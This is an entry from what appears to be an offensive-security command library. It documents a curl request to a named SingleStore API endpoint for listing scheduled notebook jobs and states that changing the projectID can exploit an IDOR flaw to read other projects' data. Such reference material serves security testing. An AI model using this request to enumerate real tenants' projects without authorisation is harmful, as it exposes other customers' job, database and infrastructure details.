---
data: >-
  curl -X GET
  "https://backend.singlestore.com/api/GetNotebookScheduledPaginatedJobs?projectID=project_id"
  -H "Authorization: Bearer access_token"
tags:
  - api
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:34.557Z'
id: 17629ad8-8bec-46d2-a6db-7b00261b77ce
verified: false
validated: true
submitted: true
---
# curl-get-scheduled-jobs

## Command

```bash
curl -X GET "https://backend.singlestore.com/api/GetNotebookScheduledPaginatedJobs?projectID=project_id" -H "Authorization: Bearer access_token"
```

## Description

This command queries the GetNotebookScheduledPaginatedJobs endpoint on the SingleStore API to retrieve paginated scheduled job information for a specified projectID. It is used to baseline legitimate access or exploit IDOR by changing the projectID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `?projectID=project_id` | Query parameter for the target project ID | Yes |
| `-H "Authorization: Bearer access_token"` | Bearer token from authentication | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://backend.singlestore.com/api/GetNotebookScheduledPaginatedJobs?projectID=12345" -H "Authorization: Bearer eyJ..."
```

### Advanced Usage

Add output to file and silent mode:

```bash
curl -s -X GET "https://backend.singlestore.com/api/GetNotebookScheduledPaginatedJobs?projectID=12345" -H "Authorization: Bearer eyJ..." > jobs.json
```

## Expected Output

JSON array like: [{"id": 1, "database_name": "prod_db", "notebook_path": "/notebooks/analysis.ipynb", "schedule_cron": "0 0 * * *", "infra_details": {"server": "us-west-1"}}]. Empty array or error if invalid.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-in-GetNotebookScheduledPaginatedJobs]]
